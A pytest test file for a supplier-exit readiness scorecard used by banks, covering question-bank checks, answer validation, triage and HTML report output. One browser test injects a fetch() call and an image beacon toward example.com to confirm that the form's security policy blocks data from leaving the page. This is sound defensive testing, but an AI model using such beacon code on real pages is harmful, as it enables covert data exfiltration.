import copy
import json
import re

import pytest

from opcp._io import ValidationFailed, load_document
from opcp._paths import data_dir
from opcp.cli import main
from opcp.questionbank import Bank, convert
from opcp.references import load_references
from opcp.scorecard import LOCKED, PARTIAL, READY, evaluate_answers, render_html

ANSWERS = load_document(data_dir("examples") / "example-bank-answers.yaml")
BANK = Bank.load()


def answers(**proc_changes):
    doc = copy.deepcopy(ANSWERS)
    doc["processes"] = [doc["processes"][2]]  # customer notifications: fully tested, Ready
    doc["processes"][0]["answers"].update(proc_changes)
    return doc


def test_bank_is_well_formed():
    assert len(BANK.questions) == 22
    ids = list(BANK.questions)
    assert all(re.fullmatch(r"ERS-[A-Z]{3}-\d{2}", i) for i in ids)
    for q in BANK.questions.values():
        if q.type == "choice":
            assert all(o["means"] for o in q.options), q.id


def test_every_reference_resolves_to_a_checked_source():
    library = load_references()
    for q in BANK.questions.values():
        for r in q.refs:
            assert r["source"] in library, (q.id, r["source"])
            assert library[r["source"]]["verified_via"]


def test_example_answers_rate_as_expected():
    r = evaluate_answers(ANSWERS)
    assert {p.id: p.rating for p in r.processes} == {
        "onboarding-idv": LOCKED, "payments-sanctions": PARTIAL, "customer-notifications": READY}
    assert r.signoff["reviewed_by"]["name"] == "R. Reviewer"


def test_measure_evidence_is_the_weakest_answer():
    r = evaluate_answers(answers(**{"ERS-EXT-02": {"value": 15}}))  # one declared answer in the swap measure
    swap = next(m for m in r.processes[0].measures if m.key == "swap")
    assert swap.evidence == "declared"
    contract = next(m for m in r.processes[0].measures if m.key == "contract")
    assert contract.evidence == "documented"


def test_evidence_claim_needs_a_named_record():
    with pytest.raises(ValidationFailed) as exc:
        evaluate_answers(answers(**{"ERS-LOG-01": {"value": "owned", "evidence": "tested"}}))
    assert any("name the record" in p for p in exc.value.problems)


def test_invalid_option_and_unknown_question_are_reported():
    with pytest.raises(ValidationFailed) as exc:
        evaluate_answers(answers(**{"ERS-LOG-01": {"value": "mostly"}, "ERS-XYZ-99": {"value": 1}}))
    text = " ".join(exc.value.problems)
    assert "must be one of" in text and "unknown question ERS-XYZ-99" in text


def test_triage_sets_criticality_and_skips_unassessed_non_critical():
    doc = copy.deepcopy(ANSWERS)
    doc["processes"].append({"id": "canteen", "name": "Staff canteen ordering", "supplier": "Vendor Q",
                             "answers": {"ERS-TRI-01": {"value": "no"}, "ERS-TRI-02": {"value": "no"}, "ERS-TRI-03": {"value": "no"}}})
    r = evaluate_answers(doc)
    assert "Staff canteen ordering" in r.signoff["not_assessed"]
    assert all(p.id != "canteen" for p in r.processes)


def test_consistency_flags_fire():
    r = evaluate_answers(answers(**{"ERS-CON-01": {"value": "no"}}))
    assert any("contract does not require it" in f for f in r.processes[0].flags)


def test_jurisdiction_filter_limits_references():
    doc = answers()
    doc["settings"] = {**doc.get("settings", {}), "jurisdictions": ["SG"]}
    r = evaluate_answers(doc)
    shown = {ref["source"] for m in r.processes[0].measures for ref in m.refs}
    assert shown and shown <= {"mas-notice-658", "mas-tprm-cp-2026"}


def test_report_states_status_and_evidence():
    html = render_html(evaluate_answers(ANSWERS))
    assert "Not a certification" in html and "Reviewed by R. Reviewer" in html
    assert 'class="ev tested"' in html and "Relates to:" in html and "Sources cited" in html


def test_bank_version_mismatch_refused():
    doc = copy.deepcopy(ANSWERS)
    doc["bank_version"] = "9.9"
    with pytest.raises(ValidationFailed):
        evaluate_answers(doc)


def test_form_is_self_contained_and_offline(tmp_path):
    path = tmp_path / "form.html"
    assert main(["scorecard", "form", str(path)]) == 0
    html = path.read_text()
    assert "ERS-LOG-01" in html and "/*BANK_JSON*/" not in html
    assert not re.search(r'<(script|link|img)[^>]+(src|href)="https?://', html)
    assert "fetch(" not in html and "XMLHttpRequest" not in html
    assert "Content-Security-Policy" in html and "default-src 'none'" in html
    payload = html.split('id="bank-data">', 1)[1].split("</script>", 1)[0]
    assert json.loads(payload)["bank"] == "opcp-exit-readiness"


def test_form_round_trip_in_a_browser(tmp_path):
    sync_api = pytest.importorskip("playwright.sync_api")
    path = tmp_path / "form.html"
    main(["scorecard", "form", str(path)])
    with sync_api.sync_playwright() as p:
        try:
            browser = p.chromium.launch()
        except Exception:  # Playwright's own Chromium not installed: try an installed Chrome
            try:
                browser = p.chromium.launch(channel="chrome")
            except Exception:
                pytest.skip("Chromium not available")
        page = browser.new_context(accept_downloads=True).new_page()
        page.goto(path.as_uri())
        page.fill("#org", "Round Trip Bank")
        page.fill("#nname", "Payments"); page.fill("#nsupp", "Vendor R"); page.click("#addbtn")
        for q, v in [("ERS-TRI-01", "yes"), ("ERS-TRI-02", "yes"), ("ERS-TRI-03", "yes")]:
            page.check(f'.q[data-q="{q}"] input[value="{v}"]')
        page.evaluate("document.querySelectorAll('details.sec').forEach(d => d.open = true)")
        for q, v in [("ERS-LOG-01", "shared"), ("ERS-LOG-02", "partly"), ("ERS-DAT-01", "partial"),
                     ("ERS-AUT-01", "vendor"), ("ERS-AUT-02", "yes"), ("ERS-CON-01", "yes"),
                     ("ERS-CON-02", "yes"), ("ERS-CON-04", "yes")]:
            page.check(f'.q[data-q="{q}"] input[value="{v}"]')
        for q, v in [("ERS-CON-03", "30"), ("ERS-EXT-01", "20"), ("ERS-EXT-02", "20"), ("ERS-EXT-03", "20")]:
            page.fill(f'.q[data-q="{q}"] input', v)
        with page.expect_download() as d:
            page.click("#dl")
        out = tmp_path / "answers.json"
        d.value.save_as(out)
        # The page's security policy stops anything typed from leaving the device, even if a script were
        # injected: requests and image beacons to another site are blocked by the browser.
        sent = page.evaluate("""async () => { try { await fetch('https://example.com/?d=1'); return 'sent'; }
                                              catch (e) { return 'blocked'; } }""")
        beacon = page.evaluate("""() => new Promise(r => { const i = new Image(); i.onload = () => r('loaded');
                                  i.onerror = () => r('blocked'); i.src = 'https://example.com/p.gif?d=1'; })""")
        assert (sent, beacon) == ("blocked", "blocked")
        browser.close()
    from opcp.scorecard import evaluate_file
    result = evaluate_file(out)
    assert result.processes[0].name == "Payments" and result.processes[0].critical


def test_empty_dependency_list_is_an_answer_with_evidence():
    r = evaluate_answers(answers(**{"ERS-DEP-01": {"value": [], "evidence": "documented", "ref": "Architecture record AR-9"}}))
    debt = next(m for m in r.processes[0].measures if m.key == "debt")
    assert debt.rating == READY and debt.evidence == "documented"


@pytest.mark.parametrize("qid,value,message", [
    ("ERS-EXT-01", 20.5, "whole number of days"),
    ("ERS-OPS-02", True, "percentage"),
    ("ERS-CON-05", "31/12/2027", "YYYY-MM-DD"),
    ("ERS-DEP-02", 42, "must be text"),
])
def test_answer_types_are_checked_by_question(qid, value, message):
    with pytest.raises(ValidationFailed) as exc:
        evaluate_answers(answers(**{qid: {"value": value}}))
    assert any(qid in p and message in p for p in exc.value.problems)


def test_non_critical_process_with_bad_evidence_is_reported_not_skipped():
    doc = copy.deepcopy(ANSWERS)
    doc["processes"].append({"id": "canteen", "name": "Canteen", "supplier": "Q", "answers": {
        "ERS-TRI-01": {"value": "no"}, "ERS-TRI-02": {"value": "no"},
        "ERS-TRI-03": {"value": "no", "evidence": "documented"}}})
    with pytest.raises(ValidationFailed) as exc:
        evaluate_answers(doc)
    assert any("name the record" in p for p in exc.value.problems)


def test_all_non_critical_still_produces_a_report():
    doc = copy.deepcopy(ANSWERS)
    doc["processes"] = [{"id": "canteen", "name": "Canteen", "supplier": "Q", "answers": {
        "ERS-TRI-01": {"value": "no"}, "ERS-TRI-02": {"value": "no"}, "ERS-TRI-03": {"value": "no"}}}]
    r = evaluate_answers(doc)
    assert r.processes == [] and r.signoff["not_assessed"] == ["Canteen"]
    assert "Canteen" in render_html(r)


def test_regulator_termination_cites_in_force_rules_first():
    q = BANK.questions["ERS-CON-04"]
    assert q.refs[0]["source"] == "mas-notice-658" and q.refs[0]["at"] == "para 7.1(g)(ii)"
    assert BANK.version == "0.2"
